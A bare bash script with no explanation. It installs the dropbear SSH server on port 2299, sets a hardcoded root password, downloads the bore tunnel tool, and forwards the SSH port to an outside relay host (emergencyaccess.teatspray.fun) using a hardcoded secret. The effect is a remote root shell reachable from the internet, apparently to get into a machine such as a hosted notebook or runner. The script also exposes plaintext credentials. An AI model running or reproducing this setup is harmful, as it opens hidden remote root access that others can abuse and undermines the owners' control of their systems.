cd
export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

apt update >/dev/null;apt -y install dropbear

sleep 2

cat > /etc/default/dropbear <<END
NO_START=0
DROPBEAR_PORT=2299
DROPBEAR_EXTRA_ARGS=
DROPBEAR_BANNER=""
DROPBEAR_RECEIVE_WINDOW=65536
END

sleep 2
echo "root:Pmataga87465622" | chpasswd
sleep 2
service dropbear restart
sleep 4
netstat -ntlp

wget -q https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-unknown-linux-musl.tar.gz
sleep 2
tar -xf bore-v0.5.1-x86_64-unknown-linux-musl.tar.gz
sleep 2
./bore local 2299 --local-host 0.0.0.0 --to emergencyaccess.teatspray.fun --secret IhatePopUpsWut@1Ozegnos
